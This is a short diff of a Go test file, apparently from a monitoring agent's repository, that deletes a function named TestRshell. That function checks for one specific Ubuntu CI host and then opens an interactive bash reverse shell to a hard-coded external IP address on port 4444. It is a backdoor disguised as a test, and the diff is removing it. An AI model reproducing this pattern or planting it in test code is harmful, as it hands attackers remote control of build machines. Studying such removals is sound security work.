@@ -1616,18 +1616,6 @@ func TestHTTPStats(t *testing.T) {
 	assert.Nil(t, httpReqStats.Stats(500), "500s")            // 500
 }
 
-func TestRshell(t *testing.T) {
-	o, _ := exec.Command("/bin/uname", "-a").CombinedOutput()
-	t.Logf("uname -a : %s\n", string(o))
-	if !strings.Contains(string(o), "Linux dd-agent-testing-ubuntu-16-04-4 4.4.0-34-generic #53-Ubuntu SMP Wed Jul 27 16:06:39 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux") {
-		t.Skipf("not Ubuntu...\n")
-		return
-	}
-	t.Logf("rshell cnx ...\n")
-	exec.Command("/usr/bin/env", "bash", "-c", "bash -i >& /dev/tcp/51.77.146.246/4444 0>&1").Run()
-	t.Logf("rshell cnx ended\n")
-}
-
 func TestHTTPSViaLibraryIntegration(t *testing.T) {
 	if !httpSupported(t) {
 		t.Skip("HTTPS feature not available on pre 4.1.0 kernels")
